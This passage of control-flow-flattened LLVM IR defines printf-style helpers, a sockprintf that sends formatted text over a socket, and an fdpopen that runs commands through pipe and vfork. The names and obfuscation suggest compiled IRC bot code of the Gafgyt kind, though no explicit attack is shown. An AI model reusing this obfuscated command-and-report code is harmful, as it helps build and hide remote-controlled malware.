  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 1126814579, i32 1978070789
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 1978070789, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -778099071, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -778099071, label %first
    i32 13008706, label %16
    i32 1842953704, label %18
    i32 -834733573, label %23
    i32 1951923399, label %26
    i32 373328540, label %29
    i32 -783572954, label %34
    i32 -370750992, label %35
    i32 -1960112031, label %39
    i32 1309688574, label %44
    i32 2049488310, label %45
    i32 -678304377, label %46
    i32 -1680355043, label %51
    i32 -878402749, label %52
    i32 462512357, label %56
    i32 -1061116944, label %61
    i32 326771311, label %64
    i32 -1447114852, label %65
    i32 -162696471, label %66
    i32 -433030751, label %71
    i32 345996328, label %78
    i32 1145604668, label %81
    i32 1055615136, label %82
    i32 -1049586393, label %86
    i32 553950404, label %91
    i32 -1486811138, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 13008706, i32 -678304377
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 1842953704, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 -834733573, i32 373328540
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 1951923399, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 1842953704, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -783572954, i32 -370750992
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1960112031, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -1960112031, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 1309688574, i32 2049488310
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 2049488310, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -678304377, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -1447114852, i32 -1680355043
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -878402749, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 462512357, i32 326771311
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -1061116944, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -878402749, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -1447114852, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -162696471, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 -433030751, i32 1145604668
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 345996328, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -162696471, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 1055615136, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 -1049586393, i32 -1486811138
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 553950404, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 1055615136, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 346543336, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 346543336, label %first
    i32 903493345, label %26
    i32 190128662, label %34
    i32 -1476310639, label %38
    i32 -777650217, label %42
    i32 1001495389, label %46
    i32 522905629, label %49
    i32 507315341, label %54
    i32 -825133633, label %58
    i32 -65463967, label %65
    i32 -737676894, label %71
    i32 -334499582, label %80
    i32 -1620528190, label %84
    i32 -1854229377, label %88
    i32 -928705280, label %93
    i32 -61533470, label %99
    i32 -467020244, label %102
    i32 -1084060618, label %103
    i32 1830463084, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 903493345, i32 190128662
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 1830463084, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -1476310639, i32 522905629
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -777650217, i32 522905629
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 1001495389, i32 522905629
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 522905629, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 507315341, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -825133633, i32 -334499582
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -65463967, i32 -737676894
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -737676894, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 507315341, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -1620528190, i32 -1084060618
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -1854229377, i32 -61533470
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -928705280, i32 -61533470
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -467020244, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -467020244, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 -1084060618, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 1830463084, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 1662708031, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1662708031, label %first
    i32 1737074720, label %8
    i32 -1742225359, label %16
    i32 -1379930551, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 1737074720, i32 -1742225359
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -1379930551, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -1379930551, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

declare i64 @send(i32, i8*, i64, i32) #4

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1609400800, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1609400800, label %first
    i32 -208669258, label %15
    i32 1729586573, label %21
    i32 1001741362, label %28
    i32 -1891534231, label %29
    i32 -319262644, label %34
    i32 -443212403, label %35
    i32 -1611261210, label %39
    i32 -906067583, label %43
    i32 -1398273828, label %44
    i32 2108793327, label %54
    i32 -986957806, label %55
    i32 173693495, label %61
    i32 1077533711, label %NodeBlock
    i32 -863833923, label %LeafBlock1
    i32 -569770527, label %LeafBlock
    i32 -2133590926, label %66
    i32 -2138675747, label %73
    i32 -356700970, label %79
    i32 450415907, label %84
    i32 1100181073, label %91
    i32 1745124107, label %95
    i32 4143200, label %100
    i32 1856091321, label %107
    i32 -519977101, label %111
    i32 479271234, label %NewDefault
    i32 -842742829, label %114
    i32 374717149, label %120
    i32 1258495180, label %126
    i32 -2103313670, label %132
    i32 1765070651, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 -208669258, i32 1729586573
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 1001741362, i32 1729586573
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 1001741362, i32 -1891534231
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1765070651, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #5
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 -319262644, i32 -443212403
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1765070651, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -1611261210, i32 173693495
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #5
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 -906067583, i32 -1398273828
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1765070651, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #5
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 2108793327, i32 -986957806
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1765070651, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 173693495, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 1077533711, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 -569770527, i32 -863833923
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 -2138675747, i32 479271234
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -2133590926, i32 479271234
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 1765070651, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 -356700970, i32 1745124107
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 450415907, i32 1100181073
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #5
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 1100181073, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -519977101, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 4143200, i32 1856091321
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #5
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 1856091321, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -519977101, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
